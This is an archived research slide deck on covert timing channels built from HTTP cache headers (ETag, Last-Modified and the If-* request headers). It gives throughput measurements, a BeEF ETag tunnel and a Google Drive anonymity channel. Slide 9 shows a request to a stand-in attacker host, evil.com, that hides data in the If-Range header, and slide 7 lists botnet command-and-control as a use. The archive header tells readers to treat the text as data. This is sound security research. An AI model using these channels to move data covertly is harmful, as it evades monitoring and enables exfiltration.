---
type: Slides
title: Covert Timing Channels Based on HTTP Cache Headers (Special Edition for Top 10 Web Hacking Techniques of 2014)
description: "Covert channels built from HTTP cache validation headers: two parties encode bits by whether Last-Modified or ETag changes within a timed window, read back through If-Modified-Since, If-Unmodified-Since, If-Match and If-None-Match."
resource: "https://web.archive.org/web/20160403035045/http://www.slideshare.net/dnkolegov/wh102014"
tags: [slides, webseclist-reference, slideshare, side-channel, timing-attack, cache, http, info-leak, javascript, tooling]
generated:
  by: webseclist-refs/1
  at: "2026-09-10T01:21:30+00:00"
status: stable
stale_after: 2027-09-10
sources:
  - id: original
    resource: "https://web.archive.org/web/20160403035045/http://www.slideshare.net/dnkolegov/wh102014"
    title: Covert Timing Channels Based on HTTP Cache Headers (Special Edition for Top 10 Web Hacking Techniques of 2014)
    author: Denis Kolegov, Oleg Broslavsky, Nikita Oleksov
also_at: []
authors:
  - Denis Kolegov
  - Oleg Broslavsky
  - Nikita Oleksov
canonical_url: ""
cited_by:
  - "2014.md:14"
commit: ""
content_sha256: f59c0969ddf70a6112edcb9e5baffc1338a831f2607f0fda8ca2bd5c6cfdb23c
depth: full
depth_reason: default
kind: slides
language: ""
licence: unknown
original_url: "https://web.archive.org/web/20160403035045/http://www.slideshare.net/dnkolegov/wh102014"
published: ""
publisher: SlideShare
publisher_english: ""
raw_sha256: 6444a460ff16d3964197dc68e89242e2f253b52f1a4fd436a49e4ecc7ea21b3f
retrieved_from: "https://web.archive.org/web/20160403035045/http://www.slideshare.net/dnkolegov/wh102014"
retrieved_kind: manual-import
retrieved_utc: "2026-09-10T01:21:30+00:00"
slug: slideshare-covert-timing-channels-based-http-cache-headers-special-edition-2014
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Covert Timing Channels Based on HTTP Cache Headers (Special Edition for Top 10 Web Hacking Techniques of 2014)

**Covert Timing Channels Based on HTTP Cache Headers (Special Edition for Top 10 Web Hacking Techniques of 2014)** - Denis Kolegov, Oleg Broslavsky, Nikita Oleksov, SlideShare.

- Published: date not stated
- Original: <https://web.archive.org/web/20160403035045/http://www.slideshare.net/dnkolegov/wh102014>
- Preserved from: https://web.archive.org/web/20160403035045/http://www.slideshare.net/dnkolegov/wh102014 (manual-import) on 2026-09-10
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# Covert Timing Channels Based on HTTP Cache Headers

Top 10 Web Hacking Techniques of 2014 — Special Edition

*Archive note: this presentation contains 50 numbered slides. The prior image count of 53 included repeated or non-slide images. All 50 original slide images are preserved below. Source HTTP status labels and examples are retained as printed, including “304 OK” and “412 OK”.*

## Slide 1

COVERT TIMING CHANNELS
BASED ON HTTP CACHE
HEADERS
Denis Kolegov, Oleg Broslavsky, Nikita Oleksov
F5 Networks
Tomsk State University Information Security and Cryptography Department
Top 10 Web Hacking Techniques of 2014
Special Edition
ZeroNights (13-14 November 2014) Moscow, Russia
SibeCrypt (8-13 September 2014) Ekaterinburg, Russia

![Original slide 1](../../figures/2014/covert-timing-http-cache/slide-01.png)

## Slide 2

Who we are?

- Denis Kolegov
– Sr. security test engineer at F5 Networks
– PhD, associate professor at Tomsk State University Information
Security and Cryptography Department

- Oleg Broslavsky
– 3rd year student at Tomsk State University Information Security
and Cryptography Department
– Member of TSU’s SiBears Capture the Flag team

- Nikita Oleksov
– 3rd year student at Tomsk State University Information Security
and Cryptography Department
– Member of TSU’s SiBears Capture the Flag team 2

![Original slide 2](../../figures/2014/covert-timing-http-cache/slide-02.png)

## Slide 3

Prologue
This is a presentation of our research devoted to new
covert timing channels based on HTTP cache headers
We discovered previously unknown techniques and
introduced them on the ZeroNights and SibeCrypt security
conferences in 2014
In the current list of «Top 10 Web Hacking Techniques of
2014» there are many valuable and significant attacks
and, of course, we don’t think that our work is the best. We
are considering participation in 2014 Hacks as opportunity
for feedback and information sharing

![Original slide 3](../../figures/2014/covert-timing-http-cache/slide-03.png)

## Slide 4

Summary
We found and investigated previously unknown covert
timing channels based on main HTTP cache headers
We explored different properties of these covert channels
(e.g., throughput, anonymity, reliability)
We implemented most efficient ETag-based covert
channel in Browser Exploitation Framework (BeEF) for
covert communications
Also we implemented ETag-based covert timing channel
providing anonymity property to attackers in Google Drive
environment 4

![Original slide 4](../../figures/2014/covert-timing-http-cache/slide-04.png)

## Slide 5

Introduction
A covert channel is a path that can be used to transfer
information in a way not intended by the system's
designers (CWE-514)
A covert storage channel transfers information through the
setting of bits by one program and the reading of those
bits by another (CWE-515)
Covert timing channels conveys information by modulating
some aspect of system behavior over time, so that the
program receiving the information can observe system
behavior and infer protected information (CWE-385)

![Original slide 5](../../figures/2014/covert-timing-http-cache/slide-05.png)

## Slide 6

Introduction
HTTP is one of the most used protocol on the Internet so
detections of the covert channels over the HTTP is an
important research area
HTTP timing channels have received little attention in
computer security
The main HTTP covert timing channel throughput is equal
to 1.82 bps [1]. This channel doesn’t use any HTTP
mechanisms and is based on TCP/IP timing channel
Server-to-Client DNS-tunnel [3] implemented in BeEF has
throughput equal to 10 bit/s 6

![Original slide 6](../../figures/2014/covert-timing-http-cache/slide-06.png)

## Slide 7

HTTP Covert Channels’ Usage

- Implementation of communication channels
in targeted browsers (BeEF)

- Botnet command and control channels

- Key exchange in malicious software

- Transferring of illegal content
Introduction

![Original slide 7](../../figures/2014/covert-timing-http-cache/slide-07.png)

## Slide 8

RESPONSE (SERVER) HEADERS

- Last-Modified

- ETag
REQUEST (CLIENT) HEADERS

- If-Modified-Since

- If-Unmodified-Since

- If-Match

- If-Non-Match

- If-Range
General HTTP Cache Headers

![Original slide 8](../../figures/2014/covert-timing-http-cache/slide-08.png)

## Slide 9

Covert channels can be classified as client–server channels and server–client channels. Client-server covert channels are easier to implement. Server-client channels are more complicated and most of them are timing channels.

For example, covert storage channel via If-Range header can be implemented by the following way:

```http
GET / HTTP/1.1
Host: evil.com
If-Range: 120c7bL-32bL-4f86d4105ac62L
…
```

The arrow identifies the If-Range value as hex-encoded data.

![Original slide 9](../../figures/2014/covert-timing-http-cache/slide-09.png)

## Slide 10

Last-Modified HTTP header stores a date of the last web entity’s modification.

Request:

```http
GET / HTTP/1.1
Host: evil.com
```

Response:

```http
HTTP/1.1 200 OK
Server: nginx/1.1.19
Date: Wed, 02 Apr 2014 14:33:39 GMT
Content-Type: text/html
Content-Length: 124
Last-Modified: Wed, 02 Apr 2014 14:33:39 GMT
Connection: keep-alive
(data)
```

```mermaid
flowchart TD
 A["Request"] --> B["Response"]
```

![Original slide 10](../../figures/2014/covert-timing-http-cache/slide-10.png)

## Slide 11

The ETag value is formed from the hex values by the following way:

| Component | Value |
| --- | --- |
| file’s inode | 120c7bL |
| size | 32bL |
| last-modified time (mtime) | 4f86d4105ac62L |

Request:

```http
GET / HTTP/1.1
Host: evil.com
```

Response:

```http
HTTP/1.1 200 OK
Server: Apache/2.2.22 (Ubuntu)
Date: Wed, 02 Apr 2014 14:33:39 GMT
Content-Type: text/html
Content-Length: 124
ETag: 120c7bL-32bL-4f86d4105ac62L
Connection: keep-alive
(data)
```

```mermaid
flowchart TD
 A["Request"] --> B["Response"]
```

![Original slide 11](../../figures/2014/covert-timing-http-cache/slide-11.png)

## Slide 12

HTTP cache headers allows to web-browsers not to download a page if it hasn’t been changed since the certain time.

```http
GET / HTTP/1.1
Host: evil.com
If-None-Match: 120c7bL-32bL-4f86d4105ac62L
(other headers)
```

```http
GET / HTTP/1.1
Host: evil.com
If-Modified-Since: Wed, 02 Apr 2014 14:33:39 GMT
(other headers)
```

```mermaid
flowchart TD
 A["Request"] --> B["Page has been changed: HTTP/1.1 200 OK (page data)"]
 A --> C["Page has not been changed: HTTP/1.1 304 OK (only headers)"]
```

![Original slide 12](../../figures/2014/covert-timing-http-cache/slide-12.png)

## Slide 13

Second pair of headers does the same as previous but with logically inverse condition.

```http
GET / HTTP/1.1
Host: evil.com
If-Match: 120c7bL-32bL-4f86d4105ac62L
(other headers)
```

```http
GET / HTTP/1.1
Host: evil.com
If-Unmodified-Since: Wed, 02 Apr 2014 14:33:39 GMT
(other headers)
```

```mermaid
flowchart TD
 A["Request"] --> B["Page has been changed: HTTP/1.1 412 OK (page data)"]
 A --> C["Page has not been changed: HTTP/1.1 200 OK (only headers)"]
```

![Original slide 13](../../figures/2014/covert-timing-http-cache/slide-13.png)

## Slide 14

Two different threat models:

- Payload is read-only; page.html is write-only; the web server is not controlled by an attacker.
- The web server is fully controlled by an attacker.

The original diagram marks the web server as the trusted boundary. Arrow directions below preserve the source’s read/write notation; dashed edges are the outer HTTP flows.

```mermaid
flowchart LR
 P["Payload"]
 S["Server"]
 Q["HTTP request"]
 subgraph TB["Trusted boundary"]
 W["Web server"]
 end
 H["page.html: write_t"]
 R["HTTP response"]
 Z["Zombie"]
 L["Local storage"]
 W -->|read| Q
 W -->|write| H
 W -->|write| R
 Z -->|read| R
 Z -->|write| L
 H -. HTTP response .-> P
 L -. HTTP request .-> H
 S -->|read| P
 S -->|write| Q
```

![Original slide 14](../../figures/2014/covert-timing-http-cache/slide-14.png)

## Slide 15

General Covert Channels Scheme

```mermaid
flowchart TD
 A["HTTP request"] --> B["Get new header value"]
 B --> C{"Header was changed?"}
 C -->|then| D["Received 1"]
 C -->|else| E["Received 0"]
 D --> F["Store header value"]
 F --> G["Wait n seconds"]
 E --> G
 G --> A
```

![Original slide 15](../../figures/2014/covert-timing-http-cache/slide-15.png)

## Slide 16

RESPONSE (SERVER) HEADERS

- Last-Modified

- ETag
REQUEST (CLIENT) HEADERS

- If-Modified-Since

- If-Unmodified-Since

- If-Match

- If-Non-Match

- If-Range
General HTTP Cache Headers

![Original slide 16](../../figures/2014/covert-timing-http-cache/slide-16.png)

## Slide 17

Last-Modified Based Channels

Header example: `Wed, 02 Apr 2014 14:33:39 GMT`.

```mermaid
flowchart TD
 A["HTTP request"] --> B["Get Last-Modified header value"]
 B --> C{"Header value was changed?"}
 C -->|then| D["Received 1"]
 C -->|else| E["Received 0"]
 D --> F["Store header value"]
 F --> G["Wait n seconds"]
 E --> G
 G --> A
```

![Original slide 17](../../figures/2014/covert-timing-http-cache/slide-17.png)

## Slide 18

Classification
Covert Timing Channels based on HTTP-date entities

- Based on Last-Modified header

- Based on If-Modified-Since header

- Based on If-Unmodified-Since header
Covert Timing Channels based on ETag entities

- Based on ETag header

- Based on If-Match header

- Based on If-None-Match header

![Original slide 18](../../figures/2014/covert-timing-http-cache/slide-18.png)

## Slide 19

Last-Modified based Channel
Zombie requests page.html and receives the HTTP
response that contains initial Last-Modified value HTTP-date0
Server performs read or write access to the page.html
To obtain 1 bit of information Zombie request page.html
again and compares the new Last-Modified value HTTP-date1 with the old one
If HTTP-date1 and HTTP-date0 is not the same, so the
Server has sent 1, otherwise Server has sent 0

![Original slide 19](../../figures/2014/covert-timing-http-cache/slide-19.png)

## Slide 20

If-Modified-Since based Channel

Header example: `Wed, 02 Apr 2014 14:33:39 GMT`.

```mermaid
flowchart TD
 A["If-Modified request"] --> C{"HTTP code is 200?"}
 C -->|then| D["Received 1"]
 C -->|else| E["Received 0"]
 D --> F["Store header value"]
 F --> G["Wait n seconds"]
 E --> G
 G --> A
```

![Original slide 20](../../figures/2014/covert-timing-http-cache/slide-20.png)

## Slide 21

If-Unmodified-Since based Channel

Header example: `Wed, 02 Apr 2014 14:33:39 GMT`.

```mermaid
flowchart TD
 A["If-Unmodified request"] --> C{"HTTP code is 412?"}
 C -->|then| D["Received 1"]
 C -->|else| E["Received 0"]
 D --> F["Store header value"]
 F --> G["Wait n seconds"]
 E --> G
 G --> A
```

![Original slide 21](../../figures/2014/covert-timing-http-cache/slide-21.png)

## Slide 22

ETag based Channel
Zombie requests page.html and receives the HTTP
response that contains initial ETag value entity-tag0
Server performs read or write access to the page.html
To obtain 1 bit of information Zombie request page.html
again and compares the new ETag value entity-tag1
If entity-tag1 and entity-tag0 is not the same, so the Server
has sent 1, otherwise Server has sent 0

![Original slide 22](../../figures/2014/covert-timing-http-cache/slide-22.png)

## Slide 23

ETag based Channel

Header example: `120c7bL-32bL-4f86d4105ac62L`.

```mermaid
flowchart TD
 A["HTTP request"] --> B["Get ETag header value"]
 B --> C{"Header value was changed?"}
 C -->|then| D["Received 1"]
 C -->|else| E["Received 0"]
 D --> F["Store header value"]
 F --> G["Wait n seconds"]
 E --> G
 G --> A
```

![Original slide 23](../../figures/2014/covert-timing-http-cache/slide-23.png)

## Slide 24

ETag based Channel

Header example: `120c7bL-32bL-4f86d4105ac62L`.

```mermaid
flowchart TD
 A["If-None-Match request"] --> C{"HTTP code is 200?"}
 C -->|then| D["Received 1"]
 C -->|else| E["Received 0"]
 D --> F["Store header value"]
 F --> G["Wait n seconds"]
 E --> G
 G --> A
```

![Original slide 24](../../figures/2014/covert-timing-http-cache/slide-24.png)

## Slide 25

ETag based Channel

Header example: `120c7bL-32bL-4f86d4105ac62L`.

```mermaid
flowchart TD
 A["If-Match request"] --> C{"HTTP code is 412?"}
 C -->|then| D["Received 1"]
 C -->|else| E["Received 0"]
 D --> F["Store header value"]
 F --> G["Wait n seconds"]
 E --> G
 G --> A
```

![Original slide 25](../../figures/2014/covert-timing-http-cache/slide-25.png)

## Slide 26

Software Implementation
In tons of possible ways we focused on

- Python – Socket library

- C++ – Boost ASIO library

- С – simple C socket library
We chose C due to its highest performance (among these
ways) and decent stability
First threat model was chosen because of its minimal
requirements

![Original slide 26](../../figures/2014/covert-timing-http-cache/slide-26.png)

## Slide 27

Some problems we solved during implementation:

| Issue | Solution |
| --- | --- |
| Server-client synchronization | Special synchronizing function |
| Different time of requests | Dynamic sleep time |
| Lateness after sleep | “Active” sleep |
| High CPU load with “active sleep” | “Dynamic” and “active” sleep combination |

![Original slide 27](../../figures/2014/covert-timing-http-cache/slide-27.png)

## Slide 28

Necessity of synchronization “read” (web client) and “write” (host) services.

**Solution:** Synchronizing function that does requests at a maximum speed (without sleep).

```mermaid
flowchart TD
 A["Send HTTP request"] --> B["Get host response"] --> C{"Page has been changed?"}
 C -->|else| A
 C -->|then| D["Continue"]
```

![Original slide 28](../../figures/2014/covert-timing-http-cache/slide-28.png)

## Slide 29

Different time of requests can break services synchronization.

**Solution:** Dynamic sleep time equals to `sleep_time − diff_time`.

```mermaid
flowchart TD
 A["Calculate time took for request: diff_time"] --> B["Sleep (sleep_time - diff_time) microseconds"]
```

![Original slide 29](../../figures/2014/covert-timing-http-cache/slide-29.png)

## Slide 30

Inaccurate sleep — after sleep (`usleep()` is used) the program can awake with 10–200 μs lateness.

**Solution:** Use “active sleep” — calculation time difference between last request and current moment while it is less than `sleep_time`.

```mermaid
flowchart TD
 A["Calc diff_time"] --> B{"diff_time < sleep_time?"}
 B -->|then| A
 B -->|else| C["Continue"]
```

![Original slide 30](../../figures/2014/covert-timing-http-cache/slide-30.png)

## Slide 31

High CPU load with “active sleep”.

**Solution:** Combine “active” and “dynamic” sleep. CONST is constant about 1000 μs (or less depending on PC performance).

```mermaid
flowchart TD
 A["Sleep (sleep_time - CONST - request_time)"] --> B["Calculate diff_time"] --> C{"diff_time < CONST?"}
 C -->|then| B
 C -->|else| D["Continue"]
```

![Original slide 31](../../figures/2014/covert-timing-http-cache/slide-31.png)

## Slide 32

| Sleep time | Min start sequence | Avg sequence | Max sequence | Speed | Accuracy |
| --- | --- | --- | --- | --- | --- |
| 1 second | 3200 bits | 8848 bits | 19712 bits | 1 bit/s | 99,82% |
| 2 seconds | 3400 bits | 10145 bits | 22143 bits | 0.5 bit/s | 99,87% |


- C-based implementation in the first threat model

- Min start sequence – minimum number of bits passed
from the beginning of a conversation till the first mistake

- Avg and Max sequence – number of bits passed without
any mistakes in a row in average and at best

- Accuracy – percent of correctly transmitted bits

![Original slide 32](../../figures/2014/covert-timing-http-cache/slide-32.png)

## Slide 33

| Sleep time | Min start sequence | Avg sequence | Max sequence | Speed | Accuracy |
| --- | --- | --- | --- | --- | --- |
| 1 second | 3200 bits | 8848 bits | 19712 bits | 1 bit/s | 99,82% |
| 0.5 seconds | 2400 bits | 8142 bits | 18123 bits | 2 bit/s | 99,5% |


- C-based implementation in the first threat model

- ETag contains mtime (last modified time with
microsecond accuracy), so theoretical channel capacity
is bigger than its practically possible one.

- Maximum practical speed of the covert channels is about
1 bit per (2L+T) seconds, where L is HTTP latency
between u2 and s1 and T is a time that is needed for
auxiliary operations

![Original slide 33](../../figures/2014/covert-timing-http-cache/slide-33.png)

## Slide 34

Google Drive API Anonymity Channel
Most of the cloud services for file hosting like Dropbox,
Google Drive and others allow users to operate with files’
ETags and other cache-control headers
So it is possible to implement ETag based covert timing
channel in the first threat model: there are channel
processes Server(attacker1) and Zombie (attacker2) on
different hosts and fully trusted web server
https://drive.google.com/drive/ with some file hosted on it.
The only requirement for that is file should be accessible
for writing by attacker1 and for reading by attacker2

![Original slide 34](../../figures/2014/covert-timing-http-cache/slide-34.png)

## Slide 35

Google Drive API Anonymity Channel
Covert channel’s logic is the same as before:

- attacker1 sends a request to Google Drive API
POST https://www.googleapis.com/drive/v2/files/fileId/touch
to modify file’s last access time (and hence ETag)

- attacker2 sends a request to Google Drive API
GET https://www.googleapis.com/drive/v2/files/fileId
to get file’s metadata (including ETag)
This channel has property that provides anonymity
for communications between Server and Zombie

![Original slide 35](../../figures/2014/covert-timing-http-cache/slide-35.png)

## Slide 36

Google Drive API anonymity covert channel based on ETag header.

| Message length | 256 bit | 512 bit | 1024 bit | 2048 bit | 4096 bit |
| --- | --- | --- | --- | --- | --- |
| Accuracy | 99.87% | 99.84% | 99.8% | 99.8% | 99.78% |
| Average throughput | 2.92 bit/s | 2.9 bit/s | 2.88 bit/s | 2.88 bit/s | 2.86 bit/s |

![Original slide 36](../../figures/2014/covert-timing-http-cache/slide-36.png)

## Slide 37

Advantages in the First Threat Model

- Anonymity

- Does not modify common HTTP request structure

- Does not require web-server modifications

- Any read-only activity on web page that is used by the
channel do not break its work

- Information flow looks like something refreshes a web
page every n seconds

- Covert channels based on If-* headers can work even if
Last-Modified or Etag are disabled

![Original slide 37](../../figures/2014/covert-timing-http-cache/slide-37.png)

## Slide 38

In the second threat model we can avoid necessity of client-server synchronization by waiting for the request and responding directly.

```mermaid
flowchart TD
 A["WAIT for HTTP request"] --> B{"Current message bit is 1?"}
 B -->|then| C["Send new header value"] --> D["Store header value"] --> A
 B -->|else| E["Send old header value"] --> A
```

![Original slide 38](../../figures/2014/covert-timing-http-cache/slide-38.png)

## Slide 39

C-based client, Apache + PHP-based server.

| Header | Network | Average HTTP ping | Speed |
| --- | --- | --- | --- |
| ETag | Local host | 0.55 ms | 986 bit/s |
| ETag | «Digital Ocean» DC LAN | 1.63 ms | 845.65 bit/s |
| ETag | LAN | 6.9 ms | 295.69 bit/s |
| ETag | Internet | 113.2 ms | 13.09 bit/s |

![Original slide 39](../../figures/2014/covert-timing-http-cache/slide-39.png)

## Slide 40

C-based client, Flask + Python-based server.

| Header | Network | Average HTTP ping | Speed |
| --- | --- | --- | --- |
| ETag | Local host | 0.55 ms | 981 bit/s |
| ETag | «Digital Ocean» DC LAN | 1.63 ms | 865.83 bit/s |
| ETag | LAN | 6.9 ms | 293.9 bit/s |
| ETag | Internet | 103.2 ms | 14.39 bit/s |

![Original slide 40](../../figures/2014/covert-timing-http-cache/slide-40.png)

## Slide 41

Advantages in Second Threat Model

- Does not modify common HTTP request structure

- Information flow looks like something refreshes a web
page every n seconds

- Higher throughput

- Reliability

- Simplicity

- This approach is applicable for implementation of covert
channels based on HTTP cache headers in browsers

![Original slide 41](../../figures/2014/covert-timing-http-cache/slide-41.png)

## Slide 42

Covert Channels in Browsers
Issues

- Lack of any “sleep” function

- Low accuracy of existing time management functions

- Difficulties with synchronization of covert channel’s
server and client
So implementation of the used model is pointless, but it is
possible to implement covert channels in these restrictions
using controlled web server in the second threat model

![Original slide 42](../../figures/2014/covert-timing-http-cache/slide-42.png)

## Slide 43

Implementation of ETag-based covert channel in browser (client on JavaScript).

| Header | Server | Average HTTP ping | Throughput |
| --- | --- | --- | --- |
| Last-Modified | 0.045 ms | 70 ms | 1 bit/s |
| Last-Modified | 18 ms | 68 ms | 1 bit/s |
| ETag | Python | 66 ms | 11.51 bit/s |
| ETag | PHP | 72 ms | 10.8 bit/s |

*Archive note: the first two entries in the source’s “Server” column are time values; preserved as printed.*

![Original slide 43](../../figures/2014/covert-timing-http-cache/slide-43.png)

## Slide 44

Covert Channels in BeEF
“BeEF allows the professional penetration tester to assess the actual
security posture of a target environment by using client-side attack
vectors.”
The main idea was proposed in Kenton Born’s paper “Browser-based
covert data exfiltration” [2] and is being used in BeEF [3]
To investigate covert timing channels in browsers we implemented
server-to-client DNS and ETag Tunnels using AJAX and then added
them to BeEF

![Original slide 44](../../figures/2014/covert-timing-http-cache/slide-44.png)

## Slide 45

| Issue | Solution |
| --- | --- |
| Server-client synchronization | Client does special request to begin conversation |
| End of message determination | Client receive some special HTTP code in response, e.g. 404 – Not Found or 403 - Forbidden |
| Single client communication only | Open a session that stores transferring bit number for each client |

![Original slide 45](../../figures/2014/covert-timing-http-cache/slide-45.png)

## Slide 46

ETag-based timing channel in BeEF
ETag Tunnel in BeEF consists s of classic two parts

- extension on Ruby, that implements server side logic via
couple of web pages mounted to BeEF webserver

- module on JavaScript, that is responsible for receiving
information from C&C BeEF server at zombie
Sources

- https://github.com/beefproject/beef/tree/master/modules/ipec/etag_client

- https://github.com/beefproject/beef/tree/master/extensions/etag

![Original slide 46](../../figures/2014/covert-timing-http-cache/slide-46.png)

## Slide 47

Implementation of ETag-based covert channel in browser (client on JavaScript).

| Network | Average ping | Average HTTP ping | 256 bit | 1024 bit |
| --- | --- | --- | --- | --- |
| Local host | 0.045 ms | 0.6 ms | 10.11 bit/s | 9.9 bit/s |
| Local network | 18 ms | 19.8 ms | 10.3 bit/s | 9.78 bit/s |
| Internet | 176 ms | 360.9 ms | 5.09 bit/s | 4.97 bit/s |

![Original slide 47](../../figures/2014/covert-timing-http-cache/slide-47.png)

## Slide 48

Proof of Concept
http://youtu.be/W2qWA7XUzGQ
https://github.com/beefproject/beef

![Original slide 48](../../figures/2014/covert-timing-http-cache/slide-48.png)

## Slide 49

1. Johnson D., Yuan Bo; Lutz P., Brown E. *Covert channels in the HTTP network protocol: Channel characterization and detecting man-in-the-middle attacks.* https://ritdml.rit.edu/handle/1850/14797
2. Kenton Born. *Browser-based covert data exfiltration.* http://arxiv.org/ftp/arxiv/papers/1004/1004.4357.pdf
3. W. Alcorn, C. Frichot, M. Orru. *The Browser Hacker’s Handbook.* http://eu.wiley.com/WileyCDA/WileyTitle/productCd-1118662091.html

![Original slide 49](../../figures/2014/covert-timing-http-cache/slide-49.png)

## Slide 50

Denis Kolegov
dnkolegov@gmail.com
@dnkolegov
Oleg Broslavsky
ovbroslavsky@gmail.com
@yalegko
Nikita Oleksov
neoleksov@gmail.com
@neoleksov

![Original slide 50](../../figures/2014/covert-timing-http-cache/slide-50.png)
